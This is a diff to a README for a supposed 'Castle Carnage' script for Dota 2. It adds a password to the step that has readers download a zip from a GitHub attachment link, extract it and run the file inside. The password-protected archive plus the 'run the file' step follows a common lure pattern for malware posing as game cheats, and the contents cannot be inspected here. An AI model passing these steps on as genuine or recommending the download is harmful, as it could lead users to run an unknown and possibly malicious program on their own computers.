@@ -18,7 +18,7 @@
 ## Download and Usage
 
 1. **Download the Script**: [Download here](https://github.com/user-attachments/files/17130043/Script.zip).
-2. **Unzip the File**: Extract the downloaded archive.
+2. **Unzip the File**: Extract the downloaded archive (Password: 369411).
 3. **Run the Script**: Open the file from the extracted folder.
 4. **Open *Dota 2* and launch the *Castle Carnage* mini-game**.
 5. **Press `F7`** to start the script, and **press `F9`** to stop it.
